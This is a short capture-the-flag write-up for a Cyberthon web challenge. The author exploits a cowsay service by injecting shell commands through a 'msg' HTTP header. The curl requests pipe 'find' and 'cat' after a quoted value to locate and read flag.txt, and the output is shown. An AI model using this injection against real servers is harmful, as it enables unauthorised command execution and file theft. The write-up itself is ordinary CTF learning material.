---
created: 2024-06-11T01:33
updated: 2024-06-11T01:35
---

> We've got intel that APOCALYPSE has an important file within this webserver named "flag.txt".
>
> Please help us retrieve its contents.
>
> The URL for this challenge:
> http://chals.cyberthon22f.ctf.sg:40201

From the networking debugger tool, we can see that all escaping are done client side. So we can just send our own command.

We can also see that the command is sent via header called `msg`

```shell
## Cowsay
curl -X "POST" "http://chals.cyberthon22f.ctf.sg:40201/cowsay" \
     -H 'msg: "e" | find .. -name "flag.txt" -print'
```

```
 _________________________________ 
< ../usr/local/flag/here/flag.txt >
 --------------------------------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

Now we can simply read the file

```shell
## Cowsay
curl -X "POST" "http://chals.cyberthon22f.ctf.sg:40201/cowsay" \
     -H 'msg: "e" | cat "../usr/local/flag/here/flag.txt"'
```

```
 _________________________ 
< Cyberthon{1_L0V3_W4GYU} >
 ------------------------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

There we have our flag
